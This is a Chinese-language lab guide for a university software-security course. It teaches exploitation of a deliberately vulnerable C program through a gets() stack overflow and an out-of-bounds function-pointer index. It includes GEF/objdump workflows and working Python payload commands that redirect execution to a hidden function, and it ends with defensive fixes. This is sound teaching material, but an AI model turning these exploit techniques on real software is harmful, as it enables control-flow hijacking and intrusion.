# Project 1 学习指南

目标:理解 `wisdom-alt.c` 中两个相互独立的漏洞,并能解释如何从输入控制程序执行流。

## 进入容器

本 project 可以直接用 [../docker-p1-p3](../docker-p1-p3) 里的 `software-security-p1p3` 镜像完成。先在宿主机确认镜像已构建:

```bash
cd "../docker-p1-p3"
podman build --network host -t software-security-p1p3 .
```

一次性进入容器:

```bash
podman run --rm -it \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  software-security-p1p3
```

进入后切到 Project 1 目录并重新编译:

```bash
cd /work/projects/1
build-labs
```

如果想保留一个可反复进入的容器:

```bash
podman run -d \
  --name p1p3-lab \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  software-security-p1p3 \
  tail -f /dev/null

podman exec -it p1p3-lab bash
```

退出容器 shell 用 `exit`;停止并删除后台容器用 `podman rm -f p1p3-lab`。如果使用 Docker,把命令里的 `podman` 换成 `docker`。

## 先读代码

重点看这几处:

| 位置 | 代码点 | 关注问题 |
| --- | --- | --- |
| `put_wisdom()` | `char wis[DATA_SIZE]` + `gets(wis)` | 输入长度不受限制,可以覆盖栈上的后续数据 |
| `main()` | `char buf[1024]` | 菜单输入先进入局部栈缓冲区 |
| `main()` | `int s = atoi(buf)` | 攻击者完全控制数组下标 |
| 全局区 | `fptr ptrs[3]` | 只有 3 个函数指针槽位 |
| `main()` | `fptr tmp = ptrs[s]; tmp();` | 没有检查 `s` 是否在 `0..2` |
| `write_secret()` | 隐藏目标函数 | 正常菜单不会调用它 |
| `pat_on_back()` | 辅助目标函数 | 可用于验证函数指针越界是否成功 |

## 漏洞 1:栈溢出

`put_wisdom()` 中 `wis` 是 128 字节栈缓冲区,但 `gets(wis)` 不知道缓冲区大小。
输入超过缓冲区容量后,会继续覆盖同一个栈帧中的其他内容,最终可以覆盖保存的返回地址。

练习问题:

1. `wis` 到返回地址之间有多少字节?
2. `write_secret()` 的地址是多少?
3. payload 应该如何排列:填充字节 + 目标地址?
4. 为什么目标地址需要按小端序写入?

建议工具:

```bash
gdb -q ./wisdom-alt      # 容器默认加载 GEF,下文直接写 gef 提示符
nm -n ./wisdom-alt | grep ' write_secret'
objdump -d ./wisdom-alt | less
```

## 漏洞 2:函数指针数组越界

`ptrs` 只有 3 个元素:

```c
fptr ptrs[3] = { NULL, get_wisdom, put_wisdom };
```

但程序直接使用用户输入的 `s`:

```c
fptr tmp = ptrs[s];
tmp();
```

如果 `s` 超出范围,程序会从 `ptrs` 之外的位置读取 4 字节,把它当作函数地址调用。
这可以让你把读取位置对准 `main()` 栈上的变量 `p`,或者对准 `buf` 中你自己布置的字节。

练习问题:

1. `&ptrs` 在哪里?这是全局地址。
2. `&p` 在哪里?这是 `main()` 的栈地址。
3. `&buf[64]` 在哪里?
4. `ptrs[s]` 的寻址单位是字节还是 `sizeof(fptr)`?
5. 如何计算让 `ptrs[s]` 读到 `p` 或 `buf[64]` 的 `s`?

可在 GEF 中设置断点:

```gdb
gef➤ break wisdom-alt.c:103
gef➤ run
gef➤ print &ptrs
gef➤ print &p
gef➤ print &buf
gef➤ print &buf[64]
gef➤ print &write_secret
```

## 两种实操路线

下面两条路线都以重新编译为前提。现代 GCC 可能不再接受官方老命令里的
`gets()` 隐式声明,可以加上 `-Wno-implicit-function-declaration`:

```bash
gcc -O0 -fno-stack-protector -ggdb -m32 -no-pie \
  -Wno-implicit-function-declaration \
  wisdom-alt.c -o wisdom-alt
```

`-O0` 让栈帧、局部变量和反汇编更适合学习观察。`-no-pie` 让 `write_secret()`
和 `ptrs` 这类代码/全局区地址稳定;栈地址仍可能受 ASLR 影响。

### 方法 A:GEF

GEF 适合做完整分析:看保护、生成 cyclic pattern、反查偏移、打印变量地址、
计算 `ptrs[s]` 的越界下标。

先确认保护状态:

```gdb
gef➤ checksec
```

本实验预期重点是无 canary、无 PIE。NX 开启不影响 ret2win/ret2func,因为我们跳到
已有函数,不是在栈上执行 shellcode。

#### A1. 栈溢出跳到 `write_secret()`

1. 生成 cyclic pattern:

   ```gdb
   gef➤ pattern create 220
   gef➤ run
   ```

2. 程序菜单出现后输入 `2`,进入 `put_wisdom()`,再把 pattern 粘进去。
   崩溃后看 `$eip`,再反查偏移:

   ```gdb
   gef➤ pattern search $eip
   gef➤ p/x &write_secret
   ```

3. payload 结构是:

   ```text
   "A" * offset + little_endian(write_secret)
   ```

当前验证环境中,GEF 显示 `$eip = 0x6261616e`,反查 offset 是 `152`,
`write_secret` 是 `0x080483b6`。这两个值是环境相关的,不要直接背。

发送 payload 时要注意一个坑:菜单读取用的是 `read(0, buf, 1023)`,如果直接
`python3 ... | ./wisdom-alt`,第一轮 `read()` 可能把菜单选项和后面的 payload 一次性
读走,导致 `gets()` 读不到 payload。可以分阶段发送:

```bash
OFFSET=152
ADDR=0x080483b6
(printf '2\n'; sleep 0.1; python3 -c '
import struct, sys
offset = int(sys.argv[1])
addr = int(sys.argv[2], 16)
sys.stdout.buffer.write(b"A" * offset + struct.pack("<I", addr) + b"\n")
' "$OFFSET" "$ADDR") | ./wisdom-alt
```

成功时会看到 `secret key`,随后程序可能因为返回地址链被破坏而崩溃;这不影响本题目标。

#### A2. 函数指针数组越界

在 `ptrs[s]` 前断住:

```gdb
gef➤ break wisdom-alt.c:103
gef➤ run
```

菜单出现后先输入 `1`,让程序停在:

```c
fptr tmp = ptrs[s];
```

然后打印关键地址:

```gdb
gef➤ p/x &ptrs
gef➤ p/x &p
gef➤ p/x &buf
gef➤ p/x &buf[64]
gef➤ p/x &write_secret
```

`ptrs[s]` 的单位是 `sizeof(fptr)`,也就是 32 位环境下的 4 字节,所以要用“指针
元素数”计算下标,不要用纯字节差:

```gdb
gef➤ p/d (unsigned int)((int *)&p - (int *)&ptrs)
gef➤ p/d (unsigned int)((int *)&buf[64] - (int *)&ptrs)
```

第一个值会让 `ptrs[s]` 读到局部变量 `p`,而 `p` 保存的是 `pat_on_back` 的函数地址。
在同一个 GEF/ASLR 设置下重新输入这个下标,应能看到:

```text
Achievement unlocked!
```

第二个值用于官方 quiz 后半段:让 `ptrs[s]` 从 `buf[64]` 开始读 4 字节。此时菜单输入
本身要布置成:

```text
<十进制下标>\x00 + padding 到 buf[64] + little_endian(write_secret)
```

这里的 `\x00` 很关键:它让 `atoi(buf)` 只解析前面的十进制下标,而后面的字节继续留在
`buf` 里,供 `ptrs[s]` 当作函数指针读取。

### 方法 B:`dmesg + objdump`

这条路线适合不用调试器完成栈溢出:用 `dmesg` 看崩溃时的指令指针,用 `objdump`
找目标函数地址。

先找 `write_secret()`:

```bash
objdump -d ./wisdom-alt | sed -n '/<write_secret>:/,+12p'
```

输出第一列就是函数地址,例如当前验证环境中是:

```text
080483b6 <write_secret>:
```

再用 marker 找返回地址偏移。思路是尝试不同长度的 `A`,让返回地址位置变成 `BBBB`。
如果成功,`dmesg` 会出现 `0x42424242`:

```bash
N=152
(printf '2\n'; sleep 0.1; python3 -c '
import sys
n = int(sys.argv[1])
sys.stdout.buffer.write(b"A" * n + b"BBBB" + b"\n")
' "$N") | ./wisdom-alt

dmesg | tail -12
```

WSL2 验证环境中看到的是 `RIP: 0023:0x42424242`;即使程序是 32 位,日志也可能写
`RIP` 而不是 `EIP`,重点看值是否是 `0x42424242`。

找到 offset 后,把 `BBBB` 换成 `write_secret()` 的小端地址即可:

```bash
OFFSET=152
ADDR=0x080483b6
(printf '2\n'; sleep 0.1; python3 -c '
import struct, sys
offset = int(sys.argv[1])
addr = int(sys.argv[2], 16)
sys.stdout.buffer.write(b"A" * offset + struct.pack("<I", addr) + b"\n")
' "$OFFSET" "$ADDR") | ./wisdom-alt
```

可能遇到的问题:

- `dmesg: read kernel buffer failed: Operation not permitted`:系统限制普通用户读内核日志。
  可检查 `cat /proc/sys/kernel/dmesg_restrict`;如果不能改系统设置,直接用 GEF 路线。
- 没看到 `0x42424242`:说明 `N` 还没正好落在返回地址上,在附近继续试,例如
  `144`, `148`, `152`, `156`。
- 直接管道发送 payload 不生效:同上,菜单处的 `read()` 可能吞掉后续输入;用 `sleep`
  分阶段发送。
- 官方 quiz 的固定地址和固定 offset 来自旧环境;不同 GCC/系统下结果可能不同。

## 环境注意

- 课程 quiz 中的具体地址来自旧 32 位环境,当前环境地址可能不同。
- 如果二进制启用了 PIE,函数和全局变量地址可能每次运行变化;学习时建议用 `-no-pie`。
- ASLR 也会影响栈地址。需要稳定复现实验时,可以在 GDB 内观察同一次运行里的地址关系。
- `quiz.md` 已经包含答案,适合最后核对,不适合作为第一次练习入口。

## 完成标准

完成这个 project 后,你应该能用自己的话解释:

- 为什么 `gets()` 是危险 API;
- 为什么数组下标检查属于内存安全边界;
- 栈变量、全局变量、函数地址分别位于进程地址空间的哪些区域;
- 为什么同一个漏洞在不同编译选项和不同系统上可能表现不同;
- 防御侧应该如何修复:替换 `gets`,限制拷贝长度,检查 `s` 的范围,开启栈保护、PIE、NX、ASLR。
